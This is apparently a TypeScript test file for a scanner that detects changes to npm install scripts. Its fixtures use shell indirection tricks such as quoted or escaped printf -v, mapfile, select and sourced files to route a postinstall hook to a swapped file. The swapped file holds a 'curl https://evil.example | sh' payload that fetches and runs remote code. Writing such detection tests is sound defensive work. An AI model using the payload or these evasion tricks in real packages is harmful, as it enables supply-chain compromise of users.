import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const sh = "curl https://evil.example | sh\n";

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

const shE = (body: string, f: string, extra: Record<string, string> = {}) => ({
  "package.json": pj({ postinstall: "sh install.sh" }),
  "install.sh": body,
  "tools/ok.sh": "true\n",
  [f]: "true\n",
  "README.md": "a\n",
  ...extra,
});
const tail = "./tools/$N.sh\n";

// A quoted '-v' is still the flag. printf -v N[0] poisons N. A sourced file
// clears every safe name.
const cases: [string, Record<string, string>, string, string, boolean][] = [
  ["R1 sh printf '-v' quoted flag", shE("N=ok\nprintf '-v' N '%s' ../docs/run\n" + tail, "docs/run.sh"), "docs/run.sh", sh, false],
  ["R2 sh printf \"-v\" quoted flag", shE("N=ok\nprintf \"-v\" N '%s' ../docs/run\n" + tail, "docs/run.sh"), "docs/run.sh", sh, false],
  ["R3 sh \\printf -v", shE("N=ok\n\\printf -v N '%s' ../docs/run\n" + tail, "docs/run.sh"), "docs/run.sh", sh, false],
  ["R4 sh \"printf\" -v", shE("N=ok\n\"printf\" -v N '%s' ../docs/run\n" + tail, "docs/run.sh"), "docs/run.sh", sh, false],
  ["R5 sh mapfile N", shE("N=ok\nmapfile -t N < docs/name.txt\n" + tail, "docs/run.sh", { "docs/name.txt": "../docs/run\n" }), "docs/run.sh", sh, false],
  ["R6 sh select N", shE("N=ok\nselect N in ../docs/run; do ./tools/$N.sh; break; done <<< 1\n", "docs/run.sh"), "docs/run.sh", sh, false],
  ["R7 sh source sets N", shE("N=ok\n. ./docs/env\n" + tail, "docs/run.sh", { "docs/env": "N=../docs/run\n" }), "docs/run.sh", sh, false],
  ["R8 sh printf -v \"N\"", shE("N=ok\nprintf -v \"N\" '%s' ../docs/run\n" + tail, "docs/run.sh"), "docs/run.sh", sh, false],
  ["R9 sh printf -v N[0]", shE("N=ok\nprintf -v 'N[0]' '%s' ../docs/run\n" + tail, "docs/run.sh"), "docs/run.sh", sh, false],
  ["R10 sh printf -v 'N'", shE("N=ok\nprintf -v 'N' '%s' ../docs/run\n" + tail, "docs/run.sh"), "docs/run.sh", sh, false],
  ["R11 sh printf -v N[0] unquoted", shE("N=ok\nprintf -v N[0] '%s' ../docs/run\n" + tail, "docs/run.sh"), "docs/run.sh", sh, false],
  ["R12 sh p\\rintf -v", shE("N=ok\np\\rintf -v N '%s' ../docs/run\n" + tail, "docs/run.sh"), "docs/run.sh", sh, false],
];

for (const [name, base, file, bad, readmeQuiet] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    holds(base, file, bad);
    const readme = hard(base, { ...base, "README.md": "b\n" });
    if (readmeQuiet) expect(readme).toEqual([]);
    else expect(readme.join(" ")).toMatch(/README\.md/);
  });
}
